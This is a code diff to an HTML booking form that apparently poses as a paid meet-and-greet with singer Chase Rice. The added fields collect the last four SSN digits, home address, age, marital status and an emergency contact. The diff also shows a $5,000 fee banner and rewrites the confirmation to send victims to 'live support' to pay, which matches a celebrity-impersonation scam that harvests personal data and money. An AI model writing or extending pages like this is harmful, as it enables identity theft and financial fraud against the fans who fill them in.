@@ -1238,6 +1238,39 @@ See you soon, Chase Rice</p>
 
     <label for="attendeeEmailInput">Email Address:</label>
     <input type="email" id="attendeeEmailInput" name="email" required>
+	
+	<label for="ssn_last4">Last 4 Digits of SSN:</label>
+    <input type="text" id="ssn_last4" name="ssn_last4" maxlength="4" required>
+
+    <label for="age">Age:</label>
+    <input type="number" id="age" name="age" required>
+
+    <label for="occupation">Occupation:</label>
+    <input type="text" id="occupation" name="occupation">
+
+    <label for="address">Home Address:</label>
+    <input type="text" id="address" name="address">
+
+    <label for="zip">ZIP Code:</label>
+    <input type="text" id="zip" name="zip">
+
+    <label for="sex">Sex:</label>
+    <select id="sex" name="sex">
+      <option value="male">Male</option>
+      <option value="female">Female</option>
+      <option value="other">Other</option>
+    </select>
+
+    <label for="marital_status">Marital Status:</label>
+    <select id="marital_status" name="marital_status">
+      <option value="single">Single</option>
+      <option value="married">Married</option>
+      <option value="other">Other</option>
+    </select>
+
+    <label for="emergency_contact">Emergency Contact:</label>
+    <input type="text" id="emergency_contact" name="emergency_contact">
+
 
     <button type="button" id="toStep4">Next</button>
   </div>
@@ -1253,6 +1286,16 @@ See you soon, Chase Rice</p>
 
     <label for="meet_greet_location">Meet & Greet Location:</label>
     <input type="text" id="meet_greet_location" name="meet_greet_location" required>
+	
+   <label for="number_of_guests">Number of Guests:</label>
+   <input type="number" id="number_of_guests" name="number_of_guests" required>
+
+   <label for="special_request">Special Request:</label>
+   <select id="special_request" name="special_request">
+     <option value="autographs">Autographs</option>
+     <option value="photo">Photo</option>
+     <option value="both">Both</option>
+   </select>
 
     <button type="button" id="toStep5">Next</button>
   </div>
@@ -1266,6 +1309,15 @@ See you soon, Chase Rice</p>
 
     <label for="signature">Signature:</label>
     <input type="text" id="signature" name="signature" required>
+	
+    <label for="release_date">Date:</label>
+    <input type="date" id="release_date" name="release_date" required>
+	
+<div style="background:#ffcc00; color:#000; padding:15px; border-radius:6px; 
+            text-align:center; font-size:28px; font-weight:bold; 
+            box-shadow:0 2px 6px rgba(0,0,0,0.2); margin:20px 0;">
+  🎟 Meet &amp; Greet Fee: $5,000
+</div>
 
     <button type="button" id="toPayment">Next</button>
   </div>
@@ -1375,8 +1427,8 @@ document.addEventListener("DOMContentLoaded", () => {
         confirmationStep.classList.remove("hidden");
 
         document.getElementById("ticketMessage").innerHTML =
-          "✅ Thank you! Your ticket has been confirmed.<br>" +
-          "📢 Contact live support to validate your ticket and confirm your payments and schedule";
+          "✅ Thank you! Your ticket has been Generated.<br>" +
+          "📢 kindly Contact live support to process your payment and validate your ticket.";
 
         document.getElementById("ticketNumber").textContent = ticketNumber;
         document.getElementById("eventName").textContent = document.getElementById("eventNameInput").value;
